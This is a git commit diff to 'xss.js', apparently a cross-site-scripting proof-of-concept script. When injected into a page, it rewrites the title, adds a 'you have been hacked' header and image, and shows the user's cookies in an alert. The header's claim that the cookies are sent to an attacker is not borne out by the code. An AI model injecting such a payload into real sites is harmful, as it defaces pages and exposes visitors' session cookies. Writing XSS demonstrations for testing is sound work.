19df5de8b631f8e0664e7a27c17e9c53d4e0a700
Abhishek Dirisipo <122773950+Abhishek-Dirisipo@users.noreply.github.com>
2024-05-21 23:02:41 +0530

    Update xss.js

--- assets/xss.js
+++ assets/xss.js
@@ -6,12 +6,19 @@ document.title = "New Website Title";
 
 // Create and append new elements
 var newHeader = document.createElement('h1');
-newHeader.textContent = "This website is under Abhishek Control now";
+newHeader.textContent = "This website is under Abhishek Control now, your cookie are sent to attacker!";
 document.body.appendChild(newHeader);
 
 var newParagraph = document.createElement('p');
 newParagraph.textContent = "Welcome to the new version of the website.";
 document.body.appendChild(newParagraph);
+
+// Create and append the image
+var newImage = document.createElement('img');
+newImage.src = "https://cdn.vectorstock.com/i/1000x1000/01/05/message-you-have-been-hacked-vector-20550105.webp";
+newImage.alt = "You have been hacked";
+newImage.style.maxWidth = "100%";
+document.body.appendChild(newImage);
 
 // Apply some basic styles
 document.body.style.fontFamily = "Arial, sans-serif";
@@ -21,6 +28,8 @@ document.body.style.padding = "20px";
 
 newHeader.style.color = "#333";
 newParagraph.style.color = "#666";
+newImage.style.display = "block";
+newImage.style.marginTop = "20px";
 
 // Alert cookies
 alert("here_are_your_cookies:_ " + document.cookie);
